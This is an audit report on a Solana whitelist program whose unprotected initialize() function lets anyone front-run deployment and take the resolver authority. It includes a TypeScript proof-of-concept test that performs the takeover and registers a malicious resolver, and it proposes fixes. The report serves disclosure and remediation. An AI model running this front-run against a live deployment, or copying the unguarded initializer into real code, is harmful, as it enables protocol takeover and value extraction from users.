# Audit Report

## Title
Unprotected Whitelist Initialization Enables Complete Access Control Takeover

## Summary
The whitelist program's `initialize()` function lacks access control, allowing any attacker to front-run the legitimate initialization and become the whitelist authority. This grants complete control over resolver registration, breaking the protocol's fundamental access control mechanism.

## Finding Description

The whitelist program contains a critical initialization vulnerability where the `initialize()` function has no access control restrictions. [1](#0-0) 

The `Initialize` account validation context only requires **any** signer but does not restrict who that signer can be. [2](#0-1)  The function simply takes whoever calls it as the authority and stores their public key.

The `WhitelistState` account stores the authority that controls all resolver registration operations. [3](#0-2) 

This authority is properly enforced in critical operations: registering resolvers [4](#0-3) , deregistering them [5](#0-4) , and transferring authority [6](#0-5) .

**Attack Scenario:**

1. Protocol team deploys the whitelist program to mainnet (program ID: `5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S`) [7](#0-6) 
2. Attacker monitors the deployment and precomputes the deterministic `WhitelistState` PDA address using the seed `WHITELIST_STATE_SEED` [8](#0-7) [9](#0-8) 
3. Before the protocol can call `initialize()`, the attacker submits a transaction calling `initialize()` with their own keypair as the signer
4. The `WhitelistState` account is created at the canonical PDA with the attacker's public key as authority
5. When the protocol attempts to initialize, the transaction fails due to the Anchor `init` constraint - the account already exists
6. The attacker now controls the whitelist authority and can:
   - Register malicious resolvers who can fill orders at unfavorable prices
   - Deregister legitimate resolvers, preventing them from executing orders
   - Transfer authority to confederates
   - Completely compromise the protocol's access control system

The fusion-swap program relies critically on whitelisted resolvers for order filling [10](#0-9)  and cancellation by resolver [11](#0-10) , making this vulnerability critical to the entire protocol's security model.

## Impact Explanation

**Severity: HIGH**

This vulnerability enables complete compromise of the protocol's access control system with the following impacts:

1. **Access Control Bypass**: An attacker becomes the whitelist authority and can authorize any resolver, breaking the fundamental security invariant that only authorized resolvers can fill orders

2. **Unauthorized Order Execution**: Malicious resolvers can fill orders at prices favorable to themselves, extracting value from makers through unfavorable execution

3. **Protocol Disruption**: Attacker can deregister all legitimate resolvers, preventing normal protocol operation and effectively shutting down the entire fusion swap system

4. **Permanent Compromise**: Once initialized with the wrong authority, there's no recovery mechanism within the program - the protocol team would need to redeploy with a completely new program ID

5. **Multi-User Impact**: Affects all protocol users, as the entire resolver authorization system is compromised

The impact is categorized as HIGH (not CRITICAL) because while it completely compromises access control, it requires front-running during initial deployment and doesn't enable direct theft of tokens from existing escrows. However, it does enable significant value extraction through malicious order fills and complete protocol disruption.

## Likelihood Explanation

**Likelihood: HIGH**

This attack is highly likely to succeed because:

1. **Simple Execution**: Requires only a single transaction with no complex setup or coordination
2. **Low Cost**: Attacker only needs minimal SOL for transaction fees (~0.00001 SOL)
3. **No Prerequisites**: No special permissions, prior protocol state, or capital requirements
4. **Detectable Timing**: Program deployment is publicly visible on-chain, giving attackers ample time to prepare front-running transactions
5. **Single Point of Failure**: The protocol has only one chance to initialize correctly; there's no retry mechanism
6. **Known Attack Vector**: Front-running initialization is a well-documented vulnerability pattern in blockchain systems

The initialization script [12](#0-11)  implements no protection against this attack vector.

## Recommendation

**Immediate Fix**: Add access control to the `initialize()` function by requiring the signer to match a hardcoded deployer public key or by using Anchor's program upgrade authority check.

**Option 1 - Hardcoded Deployer**:
Add a constraint to the `Initialize` struct requiring the authority to match an expected public key: [2](#0-1) 

Add a constant at the top of the program defining the expected deployer and modify the struct to include a constraint checking the authority matches this address.

**Option 2 - Upgrade Authority Check**:
Use Anchor's program upgrade authority validation to ensure only the program's upgrade authority can initialize the whitelist state. This ties initialization rights to program deployment rights.

**Option 3 - Two-Step Initialization**:
Implement a two-step initialization process where the first step creates the account with a temporary state, and the second step (callable only by the upgrade authority or deployer) finalizes it. This prevents front-running as the attacker cannot complete initialization.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { expect } from "chai";
import { Whitelist } from "../../target/types/whitelist";

describe("Whitelist Initialization Front-Running PoC", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.Whitelist as anchor.Program<Whitelist>;

  it("Demonstrates front-running initialization attack", async () => {
    // Attacker's keypair (any keypair can be used)
    const attacker = anchor.web3.Keypair.generate();
    
    // Fund the attacker
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Legitimate protocol team's keypair
    const legitimateAuthority = anchor.web3.Keypair.generate();
    await provider.connection.requestAirdrop(
      legitimateAuthority.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Derive the deterministic WhitelistState PDA
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );

    // ATTACKER FRONT-RUNS: Initializes the whitelist with their own authority
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();

    // Verify attacker is now the authority
    const whitelistState = await program.account.whitelistState.fetch(whitelistStatePDA);
    expect(whitelistState.authority.toString()).to.equal(attacker.publicKey.toString());

    // Legitimate protocol team attempts to initialize
    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      // Should not reach here
      expect.fail("Legitimate initialization should have failed");
    } catch (error) {
      // Expected: Account already exists
      expect(error.toString()).to.include("already in use");
    }

    // Demonstrate attacker can now register malicious resolvers
    const maliciousResolver = anchor.web3.Keypair.generate();
    await program.methods
      .register(maliciousResolver.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();

    // Verify malicious resolver is registered
    const [resolverAccessPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
      program.programId
    );
    const resolverAccess = await program.account.resolverAccess.fetch(resolverAccessPDA);
    expect(resolverAccess).to.not.be.null;

    // Demonstrate legitimate authority cannot perform any operations
    try {
      await program.methods
        .register(legitimateAuthority.publicKey)
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      expect.fail("Legitimate authority should not be able to register");
    } catch (error) {
      // Expected: Unauthorized error
      expect(error.toString()).to.include("Unauthorized");
    }

    console.log("✓ Front-running attack successful!");
    console.log("✓ Attacker is authority:", whitelistState.authority.toString());
    console.log("✓ Attacker can register malicious resolvers");
    console.log("✓ Legitimate authority is permanently locked out");
  });
});
```

## Notes

This vulnerability represents a critical flaw in the initialization pattern. The deterministic nature of the PDA combined with the lack of access control creates a permanent single point of failure during deployment. Once exploited, the only recovery is redeploying the entire program with a new program ID, which would require updating all dependent programs and client integrations.

The vulnerability is particularly severe because the whitelist program controls access to the entire Fusion Protocol's order filling mechanism. An attacker who controls the whitelist authority can effectively control which resolvers are allowed to fill orders, enabling them to:
- Extract maximum value from order fills through malicious resolver behavior
- Deny service to legitimate resolvers
- Gradually replace legitimate resolvers with malicious ones to avoid detection

This is a well-known initialization vulnerability pattern in Solana programs and should be addressed before mainnet deployment.

### Citations

**File:** programs/whitelist/src/lib.rs (L7-7)
```rust
declare_id!("5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S");
```

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L66-72)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L92-98)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L115-122)
```rust
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L125-129)
```rust
#[account]
#[derive(InitSpace)]
pub struct WhitelistState {
    pub authority: Pubkey,
}
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L647-653)
```rust
    /// Account allowed to cancel the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** scripts/whitelsit/initialize.ts (L20-42)
```typescript
async function initialize(
  connection: Connection,
  program: Program<Whitelist>,
  authorityKeypair: Keypair
): Promise<void> {
  const whitelistState = findWhitelistStateAddress(program.programId);

  const initializeIx = await program.methods
    .initialize()
    .accountsPartial({
      authority: authorityKeypair.publicKey,
      whitelistState,
    })
    .signers([authorityKeypair])
    .instruction();

  const tx = new Transaction().add(initializeIx);

  const signature = await sendAndConfirmTransaction(connection, tx, [
    authorityKeypair,
  ]);
  console.log(`Transaction signature ${signature}`);
}
```
